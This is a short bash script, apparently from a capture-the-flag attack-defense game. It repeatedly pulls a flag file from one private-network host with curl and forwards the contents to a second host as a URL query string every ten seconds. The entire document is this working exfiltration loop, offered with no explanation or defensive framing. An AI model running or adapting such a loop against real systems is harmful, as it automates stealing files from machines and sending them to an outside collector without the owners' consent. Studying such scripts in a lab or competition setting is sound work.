#!/bin/bash
#reverse flag
while true
do
    flag=$(curl -s http://172.16.80.144/flag.txt)
    curl -s http://172.16.80.1:8000/?f=$flag
    sleep 10
done